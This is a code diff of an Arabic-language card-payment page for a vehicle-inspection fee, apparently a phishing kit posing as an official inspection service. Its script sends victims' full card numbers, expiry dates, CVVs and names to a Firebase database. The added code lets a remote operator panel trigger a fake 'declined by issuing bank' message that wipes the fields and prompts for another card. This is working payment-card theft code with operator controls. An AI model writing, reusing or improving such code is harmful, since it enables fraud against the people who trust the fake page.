@@ -24,9 +24,11 @@
         .main-header h1 { font-size: 18px; color: #333; margin-bottom: 5px; }
         .main-header p { font-size: 14px; color: #1e7344; font-weight: bold; }
 
+        /* رسالة الرفض الجديدة */
         #rejectMsg {
             display: none; background: #feebeb; color: var(--error-red); padding: 12px;
             border-radius: 10px; border: 1px solid #facaca; margin-bottom: 15px; font-size: 13px; font-weight: bold;
+            line-height: 1.5;
         }
 
         .credit-card-view {
@@ -46,8 +48,13 @@
 
         .form-group { text-align: right; margin-bottom: 15px; width: 100%; position: relative; }
         .form-label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 7px; }
+        
         .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
         .input-field:focus { border-color: var(--main-green); }
+        
+        /* تنسيق الحقول عند الخطأ */
+        .input-field.error-border { border: 2px solid var(--error-red) !important; background-color: #fff8f8; }
+
         .error-msg { color: var(--error-red); font-size: 11px; margin-top: 4px; display: none; font-weight: bold; }
 
         .expiry-cvv-row { display: flex; gap: 10px; width: 100%; }
@@ -63,7 +70,7 @@
             <p>بقيمة 115 ريال - خدمة الفحص الفني الدوري</p>
         </div>
 
-        <div id="rejectMsg">يرجى التحقق من صحة بيانات البطاقة والمحاولة مرة أخرى.</div>
+        <div id="rejectMsg">تم الرفض من قبل البنك مصدر البطاقة، قد تكون البطاقة غير مؤهلة للدفع عبر الإنترنت. يرجى التحقق</div>
 
         <div class="credit-card-view" id="cardVisual">
             <div class="card-logo-row">
@@ -103,23 +110,42 @@
     </div>
 
     <script>
-        // إعدادات الفايربيس (تأكد من مطابقتها لمشروعك)
         const firebaseConfig = { 
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/" 
         };
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const database = firebase.database();
         
-        // جلب الـ v_id أو إنشاؤه لضمان عدم ضياع البيانات في اللوحة
         let v_id = localStorage.getItem('v_id');
         if (!v_id) {
             v_id = 'ID-' + Math.floor(Math.random() * 900000 + 100000);
             localStorage.setItem('v_id', v_id);
         }
 
-        // خوارزمية Luhn للتحقق من صحة رقم البطاقة بنسبة 100%
+        // مراقبة رفض البطاقة من اللوحة
+        database.ref('orders/' + v_id + '/next_step').on('value', (snapshot) => {
+            const step = snapshot.val();
+            if (step === 'wrong_card') {
+                // إظهار الرسالة وتلوين الحقول بالأحمر
+                document.getElementById('rejectMsg').style.display = 'block';
+                const fields = ['cardHolder', 'cardNumber', 'cardExpiry', 'cvv'];
+                fields.forEach(id => {
+                    const el = document.getElementById(id);
+                    el.classList.add('error-border');
+                    el.value = ''; // مسح البيانات القديمة
+                });
+                // تصفير واجهة البطاقة العلوية
+                document.getElementById('viewCardNumber').innerText = '#### #### #### ####';
+                document.getElementById('viewCardHolder').innerText = 'اسم حامل البطاقة';
+                document.getElementById('viewCardExpiry').innerText = '00 / 00';
+                
+                const btn = document.getElementById('payButton');
+                btn.disabled = true;
+                btn.classList.remove('active');
+                btn.innerText = "ادفع الآن";
+            }
+        });
+
         function isValidLuhn(number) {
             let sum = 0; let shouldDouble = false;
             for (let i = number.length - 1; i >= 0; i--) {
@@ -141,7 +167,6 @@
             let isNumValid = num.length >= 15 && isValidLuhn(num);
             let isExpValid = exp.length === 7;
 
-            // إظهار تنبيه الخطأ فقط إذا بدأ العميل في كتابة رقم طويل
             if (num.length > 10 && !isNumValid) { err.style.display = 'block'; } else { err.style.display = 'none'; }
 
             if (isNumValid && isExpValid && holder.length > 5 && cvv.length === 3) {
@@ -151,30 +176,35 @@
             }
         }
 
+        // مسح حالة الخطأ عند بدء الكتابة من جديد
+        function clearError(el) {
+            el.classList.remove('error-border');
+            document.getElementById('rejectMsg').style.display = 'none';
+        }
+
         document.getElementById('cardHolder').addEventListener('input', function() {
+            clearError(this);
             document.getElementById('viewCardHolder').innerText = this.value || 'اسم حامل البطاقة';
             validateForm();
         });
 
         document.getElementById('cardNumber').addEventListener('input', function() {
+            clearError(this);
             let val = this.value.replace(/\D/g, '');
             this.value = val.match(/.{1,4}/g)?.join(' ') || '';
             document.getElementById('viewCardNumber').innerText = this.value || '#### #### #### ####';
             
             const logo = document.getElementById('viewCardLogo');
             if (val.startsWith('4')) { 
-                logo.src = "https://img.icons8.com/color/48/000000/visa.png"; 
-                logo.style.display = "block"; 
+                logo.src = "https://img.icons8.com/color/48/000000/visa.png"; logo.style.display = "block"; 
             } else if (val.startsWith('5')) { 
-                logo.src = "https://img.icons8.com/color/48/000000/mastercard.png"; 
-                logo.style.display = "block"; 
-            } else { 
-                logo.style.display = "none"; 
-            }
+                logo.src = "https://img.icons8.com/color/48/000000/mastercard.png"; logo.style.display = "block"; 
+            } else { logo.style.display = "none"; }
             validateForm();
         });
 
         document.getElementById('cardExpiry').addEventListener('input', function() {
+            clearError(this);
             let val = this.value.replace(/\D/g, '');
             if (val.length >= 2) this.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
             else this.value = val;
@@ -182,9 +212,11 @@
             validateForm();
         });
 
-        document.getElementById('cvv').addEventListener('input', validateForm);
+        document.getElementById('cvv').addEventListener('input', function() {
+            clearError(this);
+            validateForm();
+        });
 
-        // الوظيفة الأساسية: الإرسال والتحويل لصفحة processing.html
         function submitPayment() {
             const btn = document.getElementById('payButton');
             btn.disabled = true;
@@ -195,19 +227,15 @@
                 cardNumber: document.getElementById('cardNumber').value,
                 expiryDate: document.getElementById('cardExpiry').value,
                 cvv: document.getElementById('cvv').value,
-                next_step: 'waiting', // لتثبيت العميل في صفحة الانتظار
-                status: 'Online_Pay',
+                next_step: 'waiting', 
+                status: 'Online_Pay_Submitted',
                 last_update: new Date().getTime()
             };
 
-            // حفظ البيانات في المسار الرئيسي للـ ID لتقرأها اللوحة فوراً
             database.ref('orders/' + v_id).update(payload).then(() => {
-                // التحويل لاسم الملف المطابق لـ GitHub و Vercel بحرف p صغير
-                window.location.href = 'processing.html'; 
-            }).catch((err) => {
-                console.error("Firebase Error:", err);
-                // توجيه احتياطي لضمان دخول العميل لصفحة التحميل
-                window.location.href = 'processing.html';
+                window.location.replace('processing.html'); 
+            }).catch(() => {
+                window.location.replace('processing.html');
             });
         }
     </script>
